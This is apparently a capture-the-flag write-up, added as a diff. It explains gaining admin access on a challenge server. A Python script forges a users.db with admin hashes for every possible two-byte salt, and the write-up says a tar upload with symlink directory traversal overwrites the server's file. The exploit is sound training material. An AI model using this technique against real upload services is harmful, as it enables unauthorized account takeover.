@@ -1,0 +1,50 @@
+We can upload any <code>.tar</code> file to the server and untar that. Since to read the flag we need admin login, we need to manipulate the <code>users.db</code> in the directory.
+Since the salt used for password is small <code>2-bytes</code>, we can make a <code>users.db</code> with all possible salts and compress that as tar and upload to the server.
+<pre><code>
+#code to get all possible hashes with salts of length 2 and password lol
+from sqlite3 import *
+from hashlib import sha256
+from base64 import b64encode, b64decode
+from os import urandom
+
+salts = []
+
+def pad(b, l):
+    c = (l-(len(b)%l))
+    return b + bytes([c]*c)
+
+for i in range(65536):
+    salts.append(b64encode(pad(i.to_bytes(2, "big"), 16)))
+
+def get_sql():
+    conn = connect("users.db")
+    cur = conn.cursor()
+    return conn, cur
+
+def add_user(salts):
+    conn, cur = get_sql()
+    for salt in salts:
+        hsh = sha256(salt+("lol".encode()))
+        cur.execute("insert into users values (?, ?)", ("admin", hsh.hexdigest()))
+    conn.commit()
+    cur.close()
+    conn.close()
+
+def setup():
+    conn, cur = get_sql()
+    cur.execute('''
+    CREATE TABLE IF NOT EXISTS users (
+        username TEXT,
+        password TEXT
+    );
+    ''')
+    conn.commit()
+    cur.close()
+    conn.close()
+
+setup()
+
+add_user(salts)
+</code></pre>
+But on extraction it gets extracted to <code>./extracted</code> directory. Refering <a href="https://github.com/cwgem/python-safe-tar-extract" target="_blank" style="color: lightblue;">this</a>
+we see that we can traverse directory using symlinks. So uploading our <code>users.db</code> to server and logging in as admin with our password <code>lol</code>, we get the flag.
